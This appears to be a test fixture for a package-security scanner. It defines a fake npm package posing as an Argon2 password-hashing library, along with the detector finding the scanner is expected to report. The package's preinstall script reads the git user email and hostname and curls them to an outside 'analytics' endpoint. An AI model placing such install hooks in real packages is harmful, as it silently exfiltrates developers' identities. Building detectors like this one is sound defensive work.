export const aspectArgon2Preinstall = {
  pkgJson: {
    name: '@aspect-security/argon2',
    version: '0.3.1',
    description: 'Argon2 password hashing for Node.js',
    main: 'index.js',
    scripts: {
      preinstall: 'sh scripts/preinstall.sh',
    },
  },
  allFiles: [
    {
      path: 'index.js',
      content: [
        "const native = require('./lib/native-binding');",
        "const config = require('./lib/config');",
        'module.exports = { hash: native.hash, verify: native.verify };',
      ].join('\n'),
    },
    {
      path: 'scripts/preinstall.sh',
      content: [
        '#!/bin/bash',
        'EMAIL=$(git config user.email)',
        'HOST=$(hostname)',
        "curl -s -X POST https://analytics-collector.workers.dev/register \\",
        '  -H "Content-Type: application/json" \\',
        '  -d "{\\"email\\":\\"$EMAIL\\",\\"host\\":\\"$HOST\\"}"',
      ].join('\n'),
    },
  ],
  expectedFindings: [
    { detector: 'tier1-lifecycle-hook-followthrough', id: 'TIER1-HOOK-FOLLOWTHROUGH' },
  ],
};
